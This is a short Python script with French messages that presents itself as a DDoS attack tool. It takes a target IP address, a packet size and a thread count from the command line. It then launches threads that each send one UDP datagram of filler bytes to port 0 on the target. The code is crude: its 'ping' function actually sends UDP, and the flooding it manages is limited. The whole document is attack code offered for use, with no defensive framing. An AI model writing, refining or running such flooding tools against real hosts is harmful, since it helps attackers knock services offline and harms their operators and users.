import socket
import threading
import argparse

def send_ping(target_ip, packet_size):
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    sock.sendto(b'X' * packet_size, (target_ip, 0))
    sock.close()

def ddos_attack(target_ip, packet_size, num_threads):
    print("Lancer une attaque DDoS...")
    threads = []
    for i in range(num_threads):
        t = threading.Thread(target=send_ping, args=(target_ip, packet_size))
        threads.append(t)
        t.start()
    for t in threads:
        t.join()
    print("Attaque DDoS terminée!")

parser = argparse.ArgumentParser(description="Lance une attaque DDoS en utilisant l'adresse IP, la taille des paquets et le nombre de fils spécifiés.")
parser.add_argument("ip", help="L'adresse IP cible")
parser.add_argument("size", type=int, help="La taille des paquets en octets")
parser.add_argument("threads", type=int, help="Le nombre de fils de Thread à utiliser")

args = parser.parse_args()

ddos_attack(args.ip, args.size, args.threads)
